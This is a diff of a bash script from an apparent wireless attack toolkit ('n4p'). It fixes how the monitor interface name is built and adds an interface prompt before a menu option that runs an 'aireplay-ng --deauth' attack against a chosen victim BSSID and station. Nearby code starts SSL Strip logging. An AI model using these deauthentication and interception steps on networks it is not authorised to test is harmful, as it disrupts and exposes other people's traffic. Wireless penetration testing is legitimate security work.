@@ -30,7 +30,7 @@ TXT_RST=$(tput sgr0)             # Reset
 EYES=$(tput setaf 6)
 AP_GATEWAY=$(grep routers /etc/n4p/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
 get_name "IFACE1="; IFACE1=$USE
-MON="$IFACE1mon"
+MON="${IFACE1}mon"
 
 echo "${BLD_TEA}$(cat /usr/share/n4p/opening.logo)${TXT_RST}"; sleep 1.5
 
@@ -76,6 +76,8 @@ menu()
     elif [[ $choice == 7 ]]; then
         get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
         get_name "STATION="; STATION=$USE
+        get_name "IFACE1="; IFACE1=$USE
+        MON="${IFACE1}mon"
         sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION $IFACE1mon &>/dev/null &
     elif [[ $choice == 8 ]]; then
         echo -e "SSL Strip Log File\n" > $sessionfolder/ssl.log
